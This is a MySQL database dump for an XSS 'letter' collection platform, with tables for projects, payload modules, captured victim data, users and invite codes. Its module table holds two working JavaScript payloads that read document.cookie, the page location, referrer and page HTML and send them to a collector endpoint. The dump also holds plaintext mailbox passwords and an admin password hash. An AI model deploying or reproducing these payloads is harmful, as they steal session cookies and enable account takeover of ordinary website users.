/*
Navicat MySQL Data Transfer

Source Server         : local
Source Server Version : 50713
Source Host           : localhost:3306
Source Database       : xss

Target Server Type    : MYSQL
Target Server Version : 50713
File Encoding         : 65001

Date: 2017-03-21 13:52:05
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(64) DEFAULT NULL,
  `user_pwd` varchar(64) DEFAULT NULL,
  `role_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `admin_role_id_fk` (`role_id`),
  CONSTRAINT `admin_role_id_fk` FOREIGN KEY (`role_id`) REFERENCES `role` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of admin
-- ----------------------------
INSERT INTO `admin` VALUES ('2', 'admin', 'd70488316f90e4b3b14f532f197adfa8', '1');

-- ----------------------------
-- Table structure for email
-- ----------------------------
DROP TABLE IF EXISTS `email`;
CREATE TABLE `email` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smtp` varchar(64) DEFAULT NULL,
  `email` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of email
-- ----------------------------
INSERT INTO `email` VALUES ('3', 'smtp.aliyun.com', 'xssapp@aliyun.com', '123456');
INSERT INTO `email` VALUES ('4', 'smtp.tom.com', 'xssapp@tom.com', '123456');
INSERT INTO `email` VALUES ('5', 'smtp.sohu.com', 'xssapp@sohu.com', '123456');
INSERT INTO `email` VALUES ('6', 'smtp.tom.com', 'webxss@tom.com', '123456');
INSERT INTO `email` VALUES ('7', 'smtp.aliyun.com', 'appxss@aliyun.com', '123456');

-- ----------------------------
-- Table structure for invite
-- ----------------------------
DROP TABLE IF EXISTS `invite`;
CREATE TABLE `invite` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `invite_code` varchar(32) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `status` int(1) DEFAULT '0',
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `invite_user_id_fk` (`user_id`),
  KEY `invite_code_index` (`invite_code`),
  CONSTRAINT `invite_user_id_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=131 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of invite
-- ----------------------------

-- ----------------------------
-- Table structure for letter
-- ----------------------------
DROP TABLE IF EXISTS `letter`;
CREATE TABLE `letter` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) DEFAULT NULL,
  `ref_url` varchar(255) DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  `uuid` varchar(32) DEFAULT NULL,
  `context` longtext,
  `ip` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `letter_project_id_fk` (`project_id`) USING BTREE,
  KEY `letter_uuid_index` (`uuid`),
  FULLTEXT KEY `letter_context_index` (`context`),
  CONSTRAINT `paras_project_id_fk` FOREIGN KEY (`project_id`) REFERENCES `project` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1155 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of letter
-- ----------------------------

-- ----------------------------
-- Table structure for letter_paras
-- ----------------------------
DROP TABLE IF EXISTS `letter_paras`;
CREATE TABLE `letter_paras` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `para_name` varchar(255) DEFAULT NULL,
  `letter_id` int(11) DEFAULT NULL,
  `para_value` text,
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `paras_letter_id` (`letter_id`),
  FULLTEXT KEY `para_name_index` (`para_name`),
  CONSTRAINT `paras_letter_id` FOREIGN KEY (`letter_id`) REFERENCES `letter` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5232 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of letter_paras
-- ----------------------------

-- ----------------------------
-- Table structure for menus
-- ----------------------------
DROP TABLE IF EXISTS `menus`;
CREATE TABLE `menus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(64) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `type` int(1) DEFAULT '0',
  `up_id` int(11) DEFAULT NULL,
  `seq` int(11) DEFAULT NULL,
  `code` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `menu_up_id_fk` (`up_id`),
  CONSTRAINT `menu_up_id_fk` FOREIGN KEY (`up_id`) REFERENCES `menus` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of menus
-- ----------------------------
INSERT INTO `menus` VALUES ('1', '后台首页', 'admin/base', '1', '2', '0', 'backIndex');
INSERT INTO `menus` VALUES ('2', '系统管理', '#', '0', null, '1', '');
INSERT INTO `menus` VALUES ('3', '基本设置', 'admin/setting', '1', '2', '2', 'baseSetting');
INSERT INTO `menus` VALUES ('4', '用户管理', 'admin/sysUserAdmin', '1', '18', '2', 'adminSetting');
INSERT INTO `menus` VALUES ('5', '角色管理', 'admin/roleList', '1', '18', '3', 'roleSetting');
INSERT INTO `menus` VALUES ('6', '后缀设置', 'admin/adminSuffix', '1', '2', '3', 'suffixSetting');
INSERT INTO `menus` VALUES ('9', '内容管理', '#', '0', null, '2', null);
INSERT INTO `menus` VALUES ('10', '项目管理', 'admin/projectList', '1', '9', '1', 'projectSetting');
INSERT INTO `menus` VALUES ('11', '模块管理', 'admin/moduleList', '1', '9', '2', 'moduleSetting');
INSERT INTO `menus` VALUES ('12', '信封管理', 'admin/letterList', '1', '9', '3', 'letterSetting');
INSERT INTO `menus` VALUES ('13', '用户管理', '#', '0', null, '2', null);
INSERT INTO `menus` VALUES ('14', '用户列表', 'admin/userList', '1', '13', '0', 'userSetting');
INSERT INTO `menus` VALUES ('15', '邀请码管理', 'admin/inviteList', '1', '13', '1', 'inviteSetting');
INSERT INTO `menus` VALUES ('17', '邮箱管理', 'admin/sysEmailAdmin', '1', '2', '6', 'emailSetting');
INSERT INTO `menus` VALUES ('18', '权限管理', '#', '0', null, '3', null);
INSERT INTO `menus` VALUES ('19', '调试中心', '#', '0', null, '4', null);
INSERT INTO `menus` VALUES ('20', '资源管理', 'admin/server', '1', '19', '0', 'server');
INSERT INTO `menus` VALUES ('21', '服务监听', 'admin/serverMonitor', '1', '19', '1', 'server');
INSERT INTO `menus` VALUES ('22', '缓存管理', 'admin/cache', '1', '19', '2', 'cache');

-- ----------------------------
-- Table structure for module
-- ----------------------------
DROP TABLE IF EXISTS `module`;
CREATE TABLE `module` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `remark` varchar(1024) DEFAULT NULL,
  `content` text,
  `type` int(11) DEFAULT '0',
  `update_time` datetime DEFAULT NULL,
  `title` varchar(128) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `module_id_index` (`id`),
  KEY `module_type_index` (`type`),
  KEY `module_all_index` (`user_id`,`type`),
  FULLTEXT KEY `module_remark_index` (`remark`),
  CONSTRAINT `module_user_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=54 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of module
-- ----------------------------
INSERT INTO `module` VALUES ('1', null, 'ajax钓鱼模块,适用于windows', 'Ajax = function() { function request(opt) { function fn() { } var url = opt.url || \"\"; var async = opt.async !== false, method = opt.method || \'GET\', data = opt.data || null, success = opt.success || fn, error = opt.failure || fn; method = method.toUpperCase(); if (method == \'GET\' && data) { var args = \"\"; if (typeof data == \'string\') { args = data; } else if (typeof data == \'object\') { var arr = new Array(); for ( var k in data) { var v = data[k]; arr.push(k + \"=\" + v); } args = arr.join(\"&\"); } url += (url.indexOf(\'?\') == -1 ? \'?\' : \'&\') + args; data = null; } var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject(\'Microsoft.XMLHTTP\'); xhr.onreadystatechange = function() { _onStateChange(xhr, success, error); }; xhr.open(method, url, async); if (method == \'POST\') { xhr.setRequestHeader(\'Content-type\', \'application/x-www-form-urlencoded;\'); } xhr.send(data); return xhr; } function _onStateChange(xhr, success, failure) { if (xhr.readyState == 4) { var s = xhr.status; if (s >= 200 && s < 300) { success(xhr); } else { failure(xhr); } } else { } } return { request : request }; }(); commit(); function commit() { var cookie = document.cookie; var url = document.location; var html= document.getElementsByTagName(\'html\')[0].innerHTML; cookie = encodeURIComponent(cookie); url = encodeURIComponent(url); html=encodeURIComponent(html); Ajax.request({ url : \"{api}\", data : \'url=\' + url + \'&cookie=\' + cookie, method : \"POST\", success : function(xhr) { }, error : function(xhr) { } }); }', '0', '2015-12-05 14:13:06', 'Ajax');
INSERT INTO `module` VALUES ('2', null, 'ajax钓鱼模块,适用于windows', 'var x = new Image();\r\ntry {\r\n	var myopener = \'\';\r\n	myopener = window.opener && window.opener.location ? window.opener.location\r\n			: \'\';\r\n} catch (err) {\r\n}\r\nx.src = \'{api}?location=\'\r\n		+ escape(document.location) + \'&toplocation=\'\r\n		+ escape(top.document.location) + \'&cookie=\' + escape(document.cookie)\r\n		+ \'&opener=\' + escape(myopener) + \'&referrer=\'\r\n		+ escape(document.referrer);', '0', '2015-12-05 14:13:06', '获取Cookie');

-- ----------------------------
-- Table structure for project
-- ----------------------------
DROP TABLE IF EXISTS `project`;
CREATE TABLE `project` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `module_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `title` varchar(128) DEFAULT NULL,
  `remark` varchar(1024) DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  `uuid` varchar(32) DEFAULT NULL,
  `uri` varchar(255) DEFAULT NULL,
  `sort_uri` varchar(255) DEFAULT NULL,
  `open_mobile` int(1) DEFAULT '0',
  `open_email` int(1) DEFAULT '0',
  `filter` varchar(2048) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `project_module_id_fk` (`module_id`),
  KEY `project_user_id_fk` (`user_id`),
  CONSTRAINT `project_module_id_fk` FOREIGN KEY (`module_id`) REFERENCES `module` (`id`),
  CONSTRAINT `project_user_id_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=189 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of project
-- ----------------------------

-- ----------------------------
-- Table structure for role
-- ----------------------------
DROP TABLE IF EXISTS `role`;
CREATE TABLE `role` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) DEFAULT NULL,
  `menus` varchar(1024) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of role
-- ----------------------------
INSERT INTO `role` VALUES ('1', '超级管理员', '1,2,8,6,17,3,9,10,12,11,13,16,15,14,18,4,7,5,19,20,21,22');

-- ----------------------------
-- Table structure for setting
-- ----------------------------
DROP TABLE IF EXISTS `setting`;
CREATE TABLE `setting` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `site_name` varchar(128) DEFAULT NULL,
  `keywords` varchar(1024) DEFAULT NULL,
  `description` varchar(1024) DEFAULT NULL,
  `copyright` varchar(128) DEFAULT NULL,
  `open_reg` int(1) DEFAULT '0' COMMENT '是否开启注册',
  `open_invite` int(1) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of setting
-- ----------------------------
INSERT INTO `setting` VALUES ('1', 'WebSos Group Xss 运营管理平台', 'WebSOS&apos;S Group,644556636', 'XSS测试平台是一个针对跨站脚本攻击或CSRF攻击漏洞为基础的测试平台，具备专业的XSS认证基础。', 'Copyright © 2014-2015 WebSos Group 版权所有 All Rights Reserved', '1', '1');

-- ----------------------------
-- Table structure for suffix
-- ----------------------------
DROP TABLE IF EXISTS `suffix`;
CREATE TABLE `suffix` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  `status` int(1) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=60 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix
-- ----------------------------
INSERT INTO `suffix` VALUES ('1', 'do', '1');
INSERT INTO `suffix` VALUES ('2', 'asp', '1');
INSERT INTO `suffix` VALUES ('3', 'php', '1');
INSERT INTO `suffix` VALUES ('4', 'aspx', '1');
INSERT INTO `suffix` VALUES ('5', 'jspx', '1');
INSERT INTO `suffix` VALUES ('6', 'phpx', '1');
INSERT INTO `suffix` VALUES ('7', 'cer', '1');
INSERT INTO `suffix` VALUES ('8', 'txt', '1');
INSERT INTO `suffix` VALUES ('9', 'ashx', '1');
INSERT INTO `suffix` VALUES ('10', 'ascx', '1');
INSERT INTO `suffix` VALUES ('11', 'ser', '1');
INSERT INTO `suffix` VALUES ('12', 'cgi', '1');
INSERT INTO `suffix` VALUES ('13', 'xml', '1');
INSERT INTO `suffix` VALUES ('14', 'html', '1');
INSERT INTO `suffix` VALUES ('15', 'htm', '1');
INSERT INTO `suffix` VALUES ('16', 'sb', '1');
INSERT INTO `suffix` VALUES ('17', 'jshx', '1');
INSERT INTO `suffix` VALUES ('18', 'gov', '1');
INSERT INTO `suffix` VALUES ('19', 'edu', '1');
INSERT INTO `suffix` VALUES ('20', 'sos', '1');
INSERT INTO `suffix` VALUES ('21', 'asa', '1');
INSERT INTO `suffix` VALUES ('22', 'asax', '1');
INSERT INTO `suffix` VALUES ('23', 'shtml', '1');
INSERT INTO `suffix` VALUES ('24', 'iis', '1');
INSERT INTO `suffix` VALUES ('25', 'swf', '1');
INSERT INTO `suffix` VALUES ('26', 'exp', '1');
INSERT INTO `suffix` VALUES ('27', 'esp', '1');
INSERT INTO `suffix` VALUES ('28', 'csp', '1');
INSERT INTO `suffix` VALUES ('29', 'psp', '1');
INSERT INTO `suffix` VALUES ('30', 'fsp', '1');
INSERT INTO `suffix` VALUES ('31', 'xsp', '1');
INSERT INTO `suffix` VALUES ('32', 'action', '2');
INSERT INTO `suffix` VALUES ('33', 'ftl', '1');
INSERT INTO `suffix` VALUES ('34', 'cmd', '1');
INSERT INTO `suffix` VALUES ('35', 'bat', '1');
INSERT INTO `suffix` VALUES ('36', 'vbs', '1');
INSERT INTO `suffix` VALUES ('37', 'vbe', '1');
INSERT INTO `suffix` VALUES ('38', 'com', '1');
INSERT INTO `suffix` VALUES ('39', 'xhtml', '1');
INSERT INTO `suffix` VALUES ('40', 'jhtml', '1');
INSERT INTO `suffix` VALUES ('41', 'tmp', '1');
INSERT INTO `suffix` VALUES ('42', 'cssx', '1');
INSERT INTO `suffix` VALUES ('43', 'jsx', '1');
INSERT INTO `suffix` VALUES ('44', 'exe', '1');
INSERT INTO `suffix` VALUES ('45', 'mspx', '1');
INSERT INTO `suffix` VALUES ('46', 'exec', '1');
INSERT INTO `suffix` VALUES ('47', 'org', '1');
INSERT INTO `suffix` VALUES ('48', 'jpgx', '1');
INSERT INTO `suffix` VALUES ('49', 'gifx', '1');
INSERT INTO `suffix` VALUES ('50', 'pngx', '1');
INSERT INTO `suffix` VALUES ('51', 'py', '1');
INSERT INTO `suffix` VALUES ('52', 'cgix', '1');
INSERT INTO `suffix` VALUES ('53', 'shell', '1');
INSERT INTO `suffix` VALUES ('54', 'csrf', '1');
INSERT INTO `suffix` VALUES ('55', 'xss', '1');

-- ----------------------------
-- Table structure for suffix_static
-- ----------------------------
DROP TABLE IF EXISTS `suffix_static`;
CREATE TABLE `suffix_static` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix_static
-- ----------------------------
INSERT INTO `suffix_static` VALUES ('1', 'css');
INSERT INTO `suffix_static` VALUES ('2', 'js');
INSERT INTO `suffix_static` VALUES ('3', 'jpg');
INSERT INTO `suffix_static` VALUES ('4', 'gif');
INSERT INTO `suffix_static` VALUES ('5', 'bmp');
INSERT INTO `suffix_static` VALUES ('6', 'ico');
INSERT INTO `suffix_static` VALUES ('7', 'txt');
INSERT INTO `suffix_static` VALUES ('8', 'exe');
INSERT INTO `suffix_static` VALUES ('9', 'zip');
INSERT INTO `suffix_static` VALUES ('10', 'rar');
INSERT INTO `suffix_static` VALUES ('11', '7z');
INSERT INTO `suffix_static` VALUES ('12', 'jpeg');
INSERT INTO `suffix_static` VALUES ('13', 'png');
INSERT INTO `suffix_static` VALUES ('14', 'doc');
INSERT INTO `suffix_static` VALUES ('15', 'ppt');
INSERT INTO `suffix_static` VALUES ('16', 'avi');
INSERT INTO `suffix_static` VALUES ('17', 'mp4');
INSERT INTO `suffix_static` VALUES ('18', 'rmvb');
INSERT INTO `suffix_static` VALUES ('19', 'flv');
INSERT INTO `suffix_static` VALUES ('20', 'woff');
INSERT INTO `suffix_static` VALUES ('21', 'woff2');
INSERT INTO `suffix_static` VALUES ('22', 'eot');
INSERT INTO `suffix_static` VALUES ('23', 'svg');
INSERT INTO `suffix_static` VALUES ('24', 'ttf');
INSERT INTO `suffix_static` VALUES ('25', 'otf');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(24) DEFAULT NULL,
  `user_pwd` varchar(40) DEFAULT NULL,
  `mobile` varchar(20) DEFAULT NULL,
  `email` varchar(32) DEFAULT NULL,
  `create_time` datetime DEFAULT NULL,
  `uuid` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_name_index` (`user_name`) USING HASH,
  KEY `user_pwd_index` (`user_pwd`) USING HASH,
  KEY `user_email_index` (`email`) USING BTREE,
  KEY `user_mobile_index` (`mobile`) USING BTREE,
  KEY `user_uuid_index` (`uuid`)
) ENGINE=InnoDB AUTO_INCREMENT=471 DEFAULT CHARSET=utf8mb4;

-- ----------------------------
-- Records of user
-- ----------------------------
